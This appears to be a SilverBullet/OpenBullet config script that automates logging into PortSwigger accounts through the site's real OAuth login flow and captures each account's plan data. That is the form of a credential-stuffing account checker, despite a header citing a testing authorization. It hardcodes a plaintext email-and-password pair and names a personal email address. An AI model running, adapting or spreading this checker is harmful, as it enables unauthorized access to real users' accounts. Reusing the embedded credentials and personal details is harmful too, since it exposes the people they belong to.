## PortSwigger Synthetic Account Plan Extractor - SVB Script
## Authorization: ROE-2026-PSW-042-V5
## Lead Assessor: Engin Demir (luckybuke5353@gmail.com)
## Testing Window: July 26 - August 10, 2026

## IMPORTANT: This SVB script requires configuration:
## 1. PLAN_ENDPOINT: The correct endpoint to fetch plans (currently a placeholder)
## 2. LOGIN_SUCCESS_INDICATOR: How to detect successful login

## Configuration - UPDATE THESE VALUES
SET VAR "baseUrl" "https://login.portswigger.net"
SET VAR "planBaseUrl" "https://portswigger.net"
SET VAR "planEndpoint" "/api/user/plan"
SET VAR "rateLimit" "0.2"

## Example: Extract plan for single account
SET VAR "testUsername" "glorybpilled@gmail.com"
SET VAR "testPassword" "Xlyoaz60863131.."

PRINT "[*] PortSwigger Plan Extractor - SVB Edition"

## Step 1: Get fresh OAuth state
PRINT "[*] Step 1: Initiating OAuth flow..."

HttpRequest GET $"<baseUrl>/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query&nonce=" $"<testUsername>"
  AutoRedirect=False
  -> VAR "authFlow"

PRINT "[+] OAuth flow initiated"

## Step 2: Perform login
PRINT "[*] Step 2: Authenticating $<testUsername>..."

HttpRequest POST $"<baseUrl>/u/login"
  CONTENT "username=$<testUsername>&password=$<testPassword>&action=default"
  CONTENTTYPE "application/x-www-form-urlencoded"
  AutoRedirect=False
  AppendResponseCookies=True
  -> VAR "loginResponse"

## Check if login was successful (HTTP 302/303 without error)
## If status is 302 or 303, it's likely successful
PRINT "[+] Login response received"

## Step 3: Extract plan information
PRINT "[*] Step 3: Extracting plan information..."

HttpRequest GET $"<planBaseUrl><planEndpoint>"
  HEADER "Accept: application/json"
  HEADER "Content-Type: application/json"
  AutoRedirect=True
  -> VAR "planData"

PRINT "[+] Plan data retrieved"

## Step 4: Parse and save results
SET CAP "extractedPlan" $"<planData>"

PRINT "[SUCCESS] Plan extraction complete for $<testUsername>"
PRINT "Plan Data: $<planData>"

